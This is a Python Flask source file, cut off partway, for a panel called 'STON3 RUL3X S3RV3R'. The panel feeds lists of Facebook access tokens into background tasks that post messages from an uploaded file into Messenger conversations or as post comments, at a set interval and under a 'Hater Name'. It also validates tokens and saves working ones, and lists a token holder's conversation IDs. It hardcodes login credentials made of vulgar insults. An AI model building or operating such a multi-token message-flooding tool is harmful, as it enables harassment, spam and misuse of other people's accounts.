from flask import Flask, request, render_template_string, redirect, session, url_for
import threading, time, requests, pytz
from datetime import datetime, timedelta
import uuid
import os
from threading import Lock

app = Flask(__name__)
app.secret_key = os.urandom(24)  # Secret key for session management

# Configure login credentials
VALID_USERNAME = "Xaryab_land_ka_baap_shan"
VALID_PASSWORD = "Xaryab_ki_mkc"

# Storage for tasks and logs with thread safety
stop_events = {}
task_logs = {}
token_usage_stats = {}
task_types = {}
user_sessions = {}  # Track user sessions and their tasks
data_lock = Lock()  # Lock for thread-safe operations

def add_log(task_id, log_message):
    with data_lock:
        if task_id not in task_logs:
            task_logs[task_id] = []
        # Keep only logs from the last 30 minutes
        cutoff_time = datetime.now() - timedelta(minutes=30)
        task_logs[task_id] = [log for log in task_logs[task_id] if log['time'] > cutoff_time]
        # Add new log with timestamp
        task_logs[task_id].append({'time': datetime.now(), 'message': log_message})

LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        body {
            background-image: url('https://i.ibb.co/RTJnwT1x/00593fdf459f12fc581a0a52405ec07c.jpg');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            height: 100vh;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Arial', sans-serif;
        }
        .login-container {
            background-color: rgba(255, 255, 255, 0.9);
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
            width: 350px;
            text-align: center;
        }
        .login-container h2 {
            margin-bottom: 20px;
            color: #333;
        }
        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }
        .form-group label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
            color: #555;
        }
        .form-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
        }
        .login-btn {
            width: 100%;
            padding: 12px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        .login-btn:hover {
            background-color: #0056b3;
        }
        .error-message {
            color: #dc3545;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Login</h2>
        <form method="POST" action="/login">
            <div class="form-group">
                <label for="username">Username:</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="form-group">
                <label for="password">Password:</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit" class="login-btn">Login</button>
            {% if error %}
            <div class="error-message">{{ error }}</div>
            {% endif %}
        </form>
    </div>
</body>
</html>
"""

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>STON3 RUL3X S3RV3R</title>
    <style>
        body {
            background-image: url('https://i.ibb.co/RTJnwT1x/00593fdf459f12fc581a0a52405ec07c.jpg');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            color: #ffffff;
            font-family: 'Roboto', sans-serif;
            margin: 0;
            padding: 20px;
        }
        h1 {
            color: #ffffff;
            text-align: center;
            margin-top: 0;
            padding-top: 20px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
        }
        .content {
            max-width: 900px;
            margin: 0 auto;
            padding: 20px;
            background-color: rgba(0, 0, 0, 0.7);
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.5);
        }
        .section {
            margin-top: 30px;
            padding: 20px;
            background-color: rgba(0, 0, 0, 0.5);
            border-radius: 8px;
            border-left: 4px solid #007bff;
        }
        .section-title {
            color: #ffffff;
            margin-top: 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
            padding-bottom: 10px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .form-label {
            color: #ffffff;
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
        }
        .form-control {
            width: 100%;
            padding: 12px;
            background-color: rgba(255, 255, 255, 0.9);
            color: #495057;
            border: 1px solid #ced4da;
            border-radius: 6px;
            box-sizing: border-box;
            font-size: 16px;
        }
        .btn {
            padding: 12px;
            margin-top: 10px;
            border: none;
            border-radius: 6px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            font-size: 16px;
            width: 100%;
        }
        .btn:hover {
            opacity: 0.9;
        }
        .btn-primary {
            background-color: #007bff;
            color: white;
        }
        .btn-secondary {
            background-color: #6c757d;
            color: white;
        }
        .btn-danger {
            background-color: #dc3545;
            color: white;
        }
        .btn-success {
            background-color: #28a745;
            color: white;
        }
        .logout-btn {
            position: absolute;
            top: 20px;
            right: 20px;
            padding: 8px 15px;
            background-color: #dc3545;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        textarea {
            min-height: 100px;
        }
        .task-item {
            background-color: rgba(0, 0, 0, 0.5);
            padding: 15px;
            margin-bottom: 15px;
            border-radius: 5px;
            border-left: 4px solid #6f42c1;
        }
        .task-actions {
            display: flex;
            gap: 10px;
            margin-top: 10px;
        }
        .task-actions .btn {
            width: auto;
            flex: 1;
        }
        .nav-tabs {
            display: flex;
            list-style: none;
            padding: 0;
            margin: 0 0 20px 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
        }
        .nav-tabs li {
            margin-right: 10px;
        }
        .nav-tabs a {
            display: block;
            padding: 10px 15px;
            background-color: rgba(0, 0, 0, 0.5);
            color: white;
            text-decoration: none;
            border-radius: 5px 5px 0 0;
        }
        .nav-tabs a.active {
            background-color: rgba(0, 123, 255, 0.7);
            font-weight: bold;
        }
        .tab-content {
            display: none;
        }
        .tab-content.active {
            display: block;
        }
        .tool-section {
            margin-bottom: 20px;
            text-align: center;
        }
        .tool-btn {
            display: inline-block;
            padding: 15px 30px;
            margin: 10px;
            background-color: rgba(0, 123, 255, 0.7);
            color: white;
            text-decoration: none;
            border-radius: 5px;
            font-weight: bold;
            transition: all 0.3s;
        }
        .tool-btn:hover {
            background-color: rgba(0, 123, 255, 0.9);
            transform: scale(1.05);
        }
        .tool-img {
            max-width: 100%;
            border-radius: 5px;
            margin-bottom: 10px;
            max-height: 200px;
            object-fit: cover;
        }
        .developer-section {
            margin-top: 30px;
            padding: 20px;
            background-color: rgba(0, 0, 0, 0.5);
            border-radius: 8px;
            text-align: center;
        }
        .developer-btn {
            display: inline-block;
            padding: 10px 20px;
            margin-top: 10px;
            background-color: #4267B2;
            color: white;
            text-decoration: none;
            border-radius: 5px;
            font-weight: bold;
        }
        @media (max-width: 768px) {
            .content {
                padding: 15px;
            }
            h1 {
                font-size: 24px;
            }
            .btn {
                padding: 10px;
            }
        }
    </style>
    <script>
        function toggleTokenInput() {
            var option = document.getElementById("tokenOption").value;
            if (option === "single") {
                document.getElementById("singleTokenGroup").style.display = "block";
                document.getElementById("multiTokenGroup").style.display = "none";
            } else {
                document.getElementById("singleTokenGroup").style.display = "none";
                document.getElementById("multiTokenGroup").style.display = "block";
            }
        }
        
        function togglePostTokenInput() {
            var option = document.getElementById("postTokenOption").value;
            if (option === "single") {
                document.getElementById("postSingleTokenGroup").style.display = "block";
                document.getElementById("postMultiTokenGroup").style.display = "none";
            } else {
                document.getElementById("postSingleTokenGroup").style.display = "none";
                document.getElementById("postMultiTokenGroup").style.display = "block";
            }
        }
        
        function showTab(tabId) {
            // Hide all tab contents
            var tabContents = document.getElementsByClassName("tab-content");
            for (var i = 0; i < tabContents.length; i++) {
                tabContents[i].classList.remove("active");
            }
            
            // Deactivate all tab links
            var tabLinks = document.getElementsByClassName("tab-link");
            for (var i = 0; i < tabLinks.length; i++) {
                tabLinks[i].classList.remove("active");
            }
            
            // Show selected tab content and activate its link
            document.getElementById(tabId).classList.add("active");
            event.currentTarget.classList.add("active");
        }
        
        // Initialize on page load
        window.onload = function() {
            toggleTokenInput();
            togglePostTokenInput();
            // Activate first tab by default
            document.querySelector('.nav-tabs li:first-child a').click();
        };
    </script>
</head>
<body>
    <button class="logout-btn" onclick="window.location.href='/logout'">Logout</button>
    <h1>STON3 RUL3X S3RV3R</h1>
    <div class="content">
        <ul class="nav-tabs">
            <li><a href="#" class="tab-link active" onclick="showTab('home')">HOME</a></li>
        </ul>
        
        <!-- Home Tab -->
        <div id="home" class="tab-content active">
            <div class="tool-section">
                <img src="https://i.ibb.co/BHc4mQGv/3f3028148b1b2d0198f10457d9257070.jpg" alt="Convo Tool" class="tool-img">
                <a href="#" class="tool-btn" onclick="showTab('conversations')">CONVO TOOL</a>
            </div>
            
            <div class="tool-section">
                <img src="https://i.ibb.co/t7prZyb/a49cea3d21ce1622c252059afba26f30.jpg" alt="Post Tool" class="tool-img">
                <a href="#" class="tool-btn" onclick="showTab('posts')">POST TOOL</a>
            </div>
            
            <div class="tool-section">
                <img src="https://i.ibb.co/gZwjVS25/1e1df5de1a628d6d6f4d4a6ad8384a47.jpg" alt="Token Checker" class="tool-img">
                <a href="#" class="tool-btn" onclick="showTab('token-checker')">TOKEN CHECKER</a>
            </div>
            
            <div class="tool-section">
                <img src="https://i.ibb.co/jvHqh7QD/13fb6dc6b204872d1040a1e94aeff66f.jpg" alt="UID Fetcher" class="tool-img">
                <a href="#" class="tool-btn" onclick="showTab('messenger-groups')">UID FETCHER</a>
            </div>
            
            <div class="tool-section">
                <img src="https://i.ibb.co/cKxrxDyX/4f0bcd72e6f013e2332463b3052c1ef1.jpg" alt="Task Manager" class="tool-img">
                <a href="#" class="tool-btn" onclick="showTab('tasks')">TASK MANAGER</a>
            </div>
            
            <div class="developer-section">
                <h3>Developer</h3>
                <img src="https://i.ibb.co/zTX9nSCv/c72b8d1b05b699844bd60faa6ff6e65c.jpg" alt="Developer" style="width: 100px; border-radius: 50%;">
                <p>TH3 STON3S</p>
                <a href="https://www.facebook.com/TH3.STON3S" class="developer-btn" target="_blank">Facebook Profile</a>
            </div>
        </div>
        
        <!-- Conversations Tab -->
        <div id="conversations" class="tab-content">
            <div class="section">
                <h2 class="section-title">Conversation Task</h2>
                <form method="POST" action="/start-task" enctype="multipart/form-data">
                    <input type="hidden" name="task_type" value="convo">
                    <div class="form-group">
                        <label class="form-label">Token Option:</label>
                        <select name="tokenOption" class="form-control" id="tokenOption" onchange="toggleTokenInput()">
                            <option value="single">Single Token</option>
                            <option value="multi">Multi Tokens</option>
                        </select>
                    </div>
                    <div class="form-group" id="singleTokenGroup">
                        <label class="form-label">Single Token:</label>
                        <input type="text" name="singleToken" class="form-control" placeholder="Enter single token">
                    </div>
                    <div class="form-group" id="multiTokenGroup" style="display:none;">
                        <label class="form-label">Token File:</label>
                        <input type="file" name="tokenFile" class="form-control">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Conversation ID:</label>
                        <input type="text" name="convo" class="form-control" required>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Message File:</label>
                        <input type="file" name="msgFile" class="form-control" required>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Speed (seconds):</label>
                        <input type="number" name="interval" class="form-control" required>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Hater Name:</label>
                        <input type="text" name="haterName" class="form-control" required>
                    </div>
                    <button class="btn btn-primary" type="submit">Start</button>
                </form>
            </div>
        </div>
        
        <!-- Posts Tab -->
        <div id="posts" class="tab-content">
            <div class="section">
                <h2 class="section-title">Post Comment Task</h2>
                <form method="POST" action="/start-task" enctype="multipart/form-data">
                    <input type="hidden" name="task_type" value="post">
                    <div class="form-group">
                        <label class="form-label">Token Option:</label>
                        <select name="tokenOption" class="form-control" id="postTokenOption" onchange="togglePostTokenInput()">
                            <option value="single">Single Token</option>
                            <option value="multi">Multi Tokens</option>
                        </select>
                    </div>
                    <div class="form-group" id="postSingleTokenGroup">
                        <label class="form-label">Single Token:</label>
                        <input type="text" name="singleToken" class="form-control" placeholder="Enter single token">
                    </div>
                    <div class="form-group" id="postMultiTokenGroup" style="display:none;">
                        <label class="form-label">Token File:</label>
                        <input type="file" name="tokenFile" class="form-control">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Post URL or ID:</label>
                        <input type="text" name="post_id" class="form-control" placeholder="Enter post URL or ID" required>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Message File:</label>
                        <input type="file" name="msgFile" class="form-control" required>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Speed (seconds):</label>
                        <input type="number" name="interval" class="form-control" required>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Hater Name:</label>
                        <input type="text" name="haterName" class="form-control" required>
                    </div>
                    <button class="btn btn-primary" type="submit">Start</button>
                </form>
            </div>
        </div>
        
        <!-- Tasks Tab -->
        <div id="tasks" class="tab-content">
            <div class="section">
                <h2 class="section-title">Task Management</h2>
                <h3>Active Tasks</h3>
                {% for task in active_tasks %}
                <div class="task-item">
                    <strong>Task ID:</strong> {{ task.id }}<br>
                    <strong>Type:</strong> {{ task.type }}<br>
                    <div class="task-actions">
                        <a href="/view-logs/{{ task.id }}" class="btn btn-secondary">View Log</a>
                        <form method="POST" action="/stop-task" style="flex: 1;">
                            <input type="hidden" name="task_id" value="{{ task.id }}">
                            <button class="btn btn-danger" type="submit">Stop Task</button>
                        </form>
                    </div>
                </div>
                {% else %}
                <p>No active tasks</p>
                {% endfor %}
            </div>
        </div>
        
        <!-- Token Checker Tab -->
        <div id="token-checker" class="tab-content">
            <div class="section">
                <h2 class="section-title">Token Checker</h2>
                <form method="POST" action="/check-tokens">
                    <div class="form-group">
                        <label class="form-label">Tokens to Check:</label>
                        <textarea name="tokens" class="form-control" placeholder="Enter one token per line" required></textarea>
                    </div>
                    <button class="btn btn-success" type="submit">Check Token</button>
                </form>
            </div>
        </div>
        
        <!-- Messenger Groups Tab -->
        <div id="messenger-groups" class="tab-content">
            <div class="section">
                <h2 class="section-title">Group UID Fetcher</h2>
                <form method="POST" action="/fetch-conversations">
                    <div class="form-group">
                        <label class="form-label">Token:</label>
                        <input type="text" name="token" class="form-control" required>
                    </div>
                    <button class="btn btn-primary" type="submit">Get</button>
                </form>
            </div>
        </div>
    </div>
</body>
</html>
"""

LOG_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Task Logs</title>
    <style>
        body { 
            background-image: url('https://i.ibb.co/RTJnwT1x/00593fdf459f12fc581a0a52405ec07c.jpg');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            color: #ffffff; 
            font-family: 'Roboto', sans-serif; 
            padding: 20px;
            margin: 0;
        }
        h1 { 
            color: #ffffff; 
            margin-top: 0;
            padding-top: 20px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
        }
        .log-container {
            max-width: 900px;
            margin: 0 auto;
            padding: 20px;
            background-color: rgba(0, 0, 0, 0.7);
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.5);
        }
        .log-entry { 
            margin: 15px 0; 
            padding: 15px; 
            border-radius: 5px; 
            background-color: rgba(0, 0, 0, 0.7);
            border-left: 4px solid #007bff;
        }
        .success { 
            border-color: #28a745;
            color: #28a745;
        }
        .error { 
            border-color: #dc3545;
            color: #dc3545;
        }
        .info { 
            border-color: #17a2b8;
            color: #17a2b8;
        }
        .token-info {
            border-color: #6f42c1;
            color: #6f42c1;
        }
        .back-btn {
            display: inline-block;
            margin: 20px 0;
            padding: 10px 20px;
            background-color: #6c757d;
            color: white;
            text-decoration: none;
            border-radius: 5px;
            font-weight: bold;
        }
        .token-stats {
            background-color: rgba(0, 0, 0, 0.7);
            padding: 15px;
            border-radius: 5px;
            margin: 15px 0;
            border-left: 4px solid #6f42c1;
            color: #ffffff;
        }
        .logout-btn {
            position: absolute;
            top: 20px;
            right: 20px;
            padding: 8px 15px;
            background-color: #dc3545;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .task-info {
            background-color: rgba(0, 0, 0, 0.7);
            padding: 15px;
            border-radius: 5px;
            margin: 15px 0;
            border-left: 4px solid #6f42c1;
        }
        @media (max-width: 768px) {
            .log-container {
                padding: 15px;
            }
            h1 {
                font-size: 24px;
            }
        }
    </style>
    <script>
        function refreshLogs() {
            fetch(window.location.href)
                .then(response => response.text())
                .then(data => {
                    const parser = new DOMParser();
                    const doc = parser.parseFromString(data, 'text/html');
                    const newLogs = doc.getElementById('logs').innerHTML;
                    document.getElementById('logs').innerHTML = newLogs;
                    // Scroll to bottom after update
                    window.scrollTo(0, document.body.scrollHeight);
                });
        }
        
        // Refresh every 3 seconds
        setInterval(refreshLogs, 3000);
        
        // Scroll to bottom on initial load
        window.onload = function() {
            window.scrollTo(0, document.body.scrollHeight);
        };
    </script>
</head>
<body>
    <button class="logout-btn" onclick="window.location.href='/logout'">Logout</button>
    <div class="log-container">
        <h1>Logs for {{ task_type }} Task ID: {{ task_id }}</h1>
        
        <div class="task-info">
            <h3>Task Information</h3>
            <p><strong>Type:</strong> {{ task_type }}</p>
            <p><strong>Target:</strong> {{ target }}</p>
            <p><strong>Started:</strong> {{ start_time.strftime('%Y-%m-%d %H:%M:%S') }}</p>
        </div>
        
        {% if token_stats %}
        <div class="token-stats">
            <h3>Token Usage Statistics</h3>
            {% for token, count in token_stats.items() %}
            <div>Token {{ loop.index }}: {{ count }} messages sent</div>
            {% endfor %}
        </div>
        {% endif %}
        
        <div id="logs">
            {% for log in logs %}
            <div class="log-entry {% if '✅' in log.message %}success{% elif '❌' in log.message %}error{% elif 'ℹ️' in log.message %}info{% elif '🔑' in log.message %}token-info{% endif %}">
                {{ log.message }}<br>
                <small>{{ log.time.strftime('%Y-%m-%d %H:%M:%S') }}</small>
            </div>
            {% endfor %}
        </div>
        <a href="/" class="back-btn">Back to Main</a>
    </div>
</body>
</html>
"""

TOKEN_CHECK_RESULT_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Token Check Results</title>
    <style>
        body { 
            background-image: url('https://i.ibb.co/RTJnwT1x/00593fdf459f12fc581a0a52405ec07c.jpg');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            color: #ffffff; 
            font-family: 'Roboto', sans-serif; 
            padding: 20px;
            margin: 0;
        }
        h1 { 
            color: #ffffff; 
            margin-top: 0;
            padding-top: 20px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
        }
        .result-container {
            max-width: 900px;
            margin: 0 auto;
            padding: 20px;
            background-color: rgba(0, 0, 0, 0.7);
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.5);
        }
        .token-result {
            margin: 15px 0; 
            padding: 15px; 
            border-radius: 5px; 
            background-color: rgba(0, 0, 0, 0.7);
            margin-bottom: 20px;
        }
        .valid {
            border-left: 4px solid #28a745;
        }
        .invalid {
            border-left: 4px solid #dc3545;
        }
        .token-info {
            font-weight: bold;
            margin-bottom: 10px;
            word-break: break-all;
        }
        .back-btn {
            display: inline-block;
            margin: 20px 0;
            padding: 10px 20px;
            background-color: #6c757d;
            color: white;
            text-decoration: none;
            border-radius: 5px;
            font-weight: bold;
        }
        .logout-btn {
            position: absolute;
            top: 20px;
            right: 20px;
            padding: 8px 15px;
            background-color: #dc3545;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .summary {
            padding: 15px;
            margin-bottom: 20px;
            background-color: rgba(0, 0, 0, 0.7);
            border-radius: 5px;
            border-left: 4px solid #6f42c1;
        }
    </style>
</head>
<body>
    <button class="logout-btn" onclick="window.location.href='/logout'">Logout</button>
    <div class="result-container">
        <h1>Token Check Results</h1>
        
        <div class="summary">
            <h3>Summary</h3>
            <p>Total Tokens Checked: {{ total_tokens }}</p>
            <p>Valid Tokens: {{ valid_count }} ({{ (valid_count/total_tokens*100 if total_tokens > 0 else 0)|round(2) }}%)</p>
            <p>Invalid Tokens: {{ invalid_count }} ({{ (invalid_count/total_tokens*100 if total_tokens > 0 else 0)|round(2) }}%)</p>
        </div>
        
        {% for result in results %}
        <div class="token-result {% if result.valid %}valid{% else %}invalid{% endif %}">
            <div class="token-info">Token {{ loop.index }}: {{ result.token_short }}</div>
            {% if result.valid %}
                <p>✅ Status: Valid</p>
                <p>👤 Name: {{ result.name }}</p>
                <p>🆔 UID: {{ result.uid }}</p>
                {% if result.picture %}
                <img src="{{ result.picture }}" width="100" style="margin-top: 10px;">
                {% endif %}
            {% else %}
                <p>❌ Status: Invalid or Expired</p>
                <p>Error: {{ result.error }}</p>
            {% endif %}
        </div>
        {% endfor %}
        
        <a href="/" class="back-btn">Back to Main</a>
    </div>
</body>
</html>
"""

CONVERSATIONS_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Conversations</title>
    <style>
        body { 
            background-image: url('https://i.ibb.co/RTJnwT1x/00593fdf459f12fc581a0a52405ec07c.jpg');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            color: #ffffff; 
            font-family: 'Roboto', sans-serif; 
            padding: 20px;
            margin: 0;
        }
        h1 { 
            color: #ffffff; 
            margin-top: 0;
            padding-top: 20px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
        }
        .result-container {
            max-width: 900px;
            margin: 0 auto;
            padding: 20px;
            background-color: rgba(0, 0, 0, 0.7);
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.5);
        }
        .conversation {
            margin: 15px 0; 
            padding: 15px; 
            border-radius: 5px; 
            background-color: rgba(0, 0, 0, 0.7);
            border-left: 4px solid #007bff;
        }
        .back-btn {
            display: inline-block;
            margin: 20px 0;
            padding: 10px 20px;
            background-color: #6c757d;
            color: white;
            text-decoration: none;
            border-radius: 5px;
            font-weight: bold;
        }
        .logout-btn {
            position: absolute;
            top: 20px;
            right: 20px;
            padding: 8px 15px;
            background-color: #dc3545;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <button class="logout-btn" onclick="window.location.href='/logout'">Logout</button>
    <div class="result-container">
        <h1>Conversations</h1>
        
        {% if error %}
        <div class="conversation" style="border-color: #dc3545;">
            <p>❌ Error: {{ error }}</p>
        </div>
        {% else %}
            {% if conversations %}
                {% for conv in conversations %}
                <div class="conversation">
                    <p><strong>💬 Conversation Name:</strong> {{ conv.name }}</p>
                    <p><strong>🆔 Conversation ID:</strong> {{ conv.id }}</p>
                </div>
                {% endfor %}
            {% else %}
                <div class="conversation">
                    <p>📭 No conversations found</p>
                </div>
            {% endif %}
        {% endif %}
        
        <a href="/" class="back-btn">Back to Main</a>
    </div>
</body>
</html>
"""

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        
        if username == VALID_USERNAME and password == VALID_PASSWORD:
            session["logged_in"] = True
            session_id = str(uuid.uuid4())
            session["session_id"] = session_id
            with data_lock:
                user_sessions[session_id] = {
                    "tasks": [],
                    "created_at": datetime.now()
                }
            return redirect(url_for("home"))
        else:
            return render_template_string(LOGIN_TEMPLATE, error="Invalid username or password")
    
    return render_template_string(LOGIN_TEMPLATE)

@app.route("/logout")
def logout():
    session_id = session.get("session_id")
    if session_id:
        with data_lock:
            if session_id in user_sessions:
                # Stop all tasks for this session
                for task_id in user_sessions[session_id]["tasks"]:
                    if task_id in stop_events:
                        stop_events[task_id].set()
                        del stop_events[task_id]
                    if task_id in task_types:
                        del task_types[task_id]
                del user_sessions[session_id]
    session.pop("logged_in", None)
    session.pop("session_id", None)
    return redirect(url_for("login"))

@app.route("/", methods=["GET"])
def home():
    if not session.get("logged_in"):
        return redirect(url_for("login"))
    
    session_id = session.get("session_id")
    if not session_id or session_id not in user_sessions:
        return redirect(url_for("logout"))
    
    try:
        with data_lock:
            active_tasks = []
            for task_id in user_sessions[session_id]["tasks"]:
                if task_id in stop_events:
                    task_type = task_types.get(task_id, "Unknown")
                    active_tasks.append({
                        'id': task_id,
                        'type': task_type
                    })
        
        return render_template_string(HTML_TEMPLATE, active_tasks=active_tasks)
    except Exception as e:
        print(f"Error in home route: {str(e)}")
        return "An error occurred while loading the page", 500

@app.route("/start-task", methods=["POST"])
def start_task():
    if not session.get("logged_in"):
        return redirect(url_for("login"))
    
    session_id = session.get("session_id")
    if not session_id or session_id not in user_sessions:
        return redirect(url_for("logout"))
    
    task_type = request.form.get("task_type", "convo")
    token_option = request.form["tokenOption"]
    interval = int(request.form["interval"])
    hater = request.form["haterName"]
    msgs = request.files["msgFile"].read().decode().splitlines()
    
    if token_option == "single":
        tokens = [request.form.get("singleToken", "").strip()]
    else:
        token_file = request.files.get("tokenFile")
        if token_file:
            tokens = [t.strip() for t in token_file.read().decode().splitlines() if t.strip()]
        else:
            tokens = []
    
    if not tokens:
        return "❌ No tokens provided"
    
    # Save tokens to file
    with open('token.txt', 'w') as f:
        for token in tokens:
            f.write(f"{token}\n")
    
    task_id = str(uuid.uuid4())
    
    with data_lock:
        stop_events[task_id] = threading.Event()
        token_usage_stats[task_id] = {token: 0 for token in tokens}
        task_types[task_id] = "Conversation" if task_type == "convo" else "Post"
        user_sessions[session_id]["tasks"].append(task_id)
    
    if task_type == "convo":
        convo = request.form["convo"]
        threading.Thread(target=start_messaging, args=(tokens, msgs, convo, interval, hater, token_option, task_id, task_type)).start()
        return f"📨 Messaging started for conversation {convo}. Task ID: {task_id}"
    elif task_type == "post":
        post_id = request.form["post_id"]
        # Clean post ID if URL is provided
        if "facebook.com" in post_id:
            post_id = post_id.split("/")[-1].split("?")[0]
        threading.Thread(target=start_posting, args=(tokens, msgs, post_id, interval, hater, token_option, task_id)).start()
        return f"📝 Commenting started for post {post_id}. Task ID: {task_id}"

@app.route("/stop-task", methods=["POST"])
def stop_task():
    if not session.get("logged_in"):
        return redirect(url_for("login"))
    
    session_id = session.get("session_id")
    if not session_id or session_id not in user_sessions:
        return redirect(url_for("logout"))
    
    task_id = request.form["task_id"]
    
    # Check if this task belongs to the current session
    if task_id not in user_sessions[session_id]["tasks"]:
        return "⚠️ You don't have permission to stop this task."
    
    with data_lock:
        if task_id in stop_events:
            stop_events[task_id].set()
            del stop_events[task_id]
            if task_id in task_types:
                del task_types[task_id]
            # Remove task from session
            user_sessions[session_id]["tasks"].remove(task_id)
            return f"🛑 Task with ID {task_id} has been stopped."
        else:
            return f"⚠️ No active task with ID {task_id}."

def save_valid_tokens(tokens):
    with open('token.txt', 'w') as f:
        for token in tokens:
            f.write(f"{token}\n")

@app.route("/check-tokens", methods=["POST"])
def check_tokens():
    if not session.get("logged_in"):
        return redirect(url_for("login"))
    
    session_id = session.get("session_id")
    if not session_id or session_id not in user_sessions:
        return redirect(url_for("logout"))
    
    tokens = [t.strip() for t in request.form.get("tokens", "").splitlines() if t.strip()]
    
    results = []
    valid_count = 0
    invalid_count = 0
    valid_tokens = []
    
    for token in tokens:
        token = token.strip()
        if not token:
            continue
            
        token_short = f"{token[:5]}...{token[-5:]}" if len(token) > 10 else token
        result = {"token": token, "token_short": token_short, "valid": False}
        
        try:
            url = f"https://graph.facebook.com/me?fields=id,name,picture&access_token={token}"
            res = requests.get(url)
            
            if res.status_code == 200:
                data = res.json()
                result.update({
                    "valid": True,
                    "uid": data.get("id", "N/A"),
                    "name": data.get("name", "Unknown"),
                    "picture": data.get("picture", {}).get("data", {}).get("url", ""),
                })
                valid_count += 1
                valid_tokens.append(token)
            else:
                result["error"] = f"HTTP {res.status_code}: {res.text}"
                invalid_count += 1
        except Exception as e:
            result["error"] = str(e)
            invalid_count += 1
        
        results.append(result)
    
    # Save valid tokens to file
    if valid_tokens:
        save_valid_tokens(valid_tokens)
    
    return render_template_string(
        TOKEN_CHECK_RESULT_TEMPLATE,
        results=results,
        total_tokens=len(results),
        valid_count=valid_count,
        invalid_count=invalid_count
    )

@app.route("/fetch-conversations", methods=["POST"])
def fetch_conversations():
    if not session.get("logged_in"):
        return redirect(url_for("login"))
    
    session_id = session.get("session_id")
    if not session_id or session_id not in user_sessions:
        return redirect(url_for("logout"))
    
    token = request.form["token"]
    conversations = []
    error = None
    
    try:
        # First verify token validity
        check_url = f"https://graph.facebook.com/me?access_token={token}"
        check_res = requests.get(check_url)
        
        if check_res.status_code != 200:
            error = "Invalid or expired token"
        else:
            # Fetch Messenger conversations
            url = f"https://graph.facebook.com/v19.0/me/conversations?fields=id,name,participants&access_token={token}"
            response = requests.get(url)
            response.raise_for_status()
            
            for conv in response.json().get('data', []):
                conv_id = conv.get('id', 'N/A').replace('t_', '')  # Remove t_ prefix
                conv_name = conv.get('name', 'Unnamed Conversation')
                
                # If no name, get participants
                if not conv_name or conv_name == 'Unnamed Conversation':
                    participants = conv.get('participants', {}).get('data', [])
                    participant_names = [p.get('name', 'Unknown') for p in participants]
                    conv_name = ", ".join(participant_names) if participant_names else "Group Chat"
                
                conversations.append({
                    'id': conv_id,
                    'name': conv_name
                })
    except Exception as e:
        error = str(e)
    
    return render_template_string(
        CONVERSATIONS_TEMPLATE,
        conversations=conversations,
        error=error
    )

@app.route("/view-logs/<task_id>")
def show_logs(task_id):
    if not session.get("logged_in"):
        return redirect(url_for("login"))
    
    session_id = session.get("session_id")
    if not session_id or session_id not in user_sessions:
        return redirect(url_for("logout"))
    
    # Check if this task belongs to the current session
    if task_id not in user_sessions[session_id]["tasks"]:
        return redirect(url_for("home"))
    
    with data_lock:
        logs = task_logs.get(task_id, [{'time': datetime.now(), 'message': "No logs found for this task."}])
        stats = token_usage_stats.get(task_id, {})
        task_type = task_types.get(task_id, "Unknown")
    
    # Get the first log entry to determine start time
    start_time = logs[0]['time'] if logs else datetime.now()
    
    # Get target information from logs
    target = "Unknown"
    for log in logs:
        if "Target Group:" in log['message']:
            target = log['message'].split("Target Group:")[1].strip()
            break
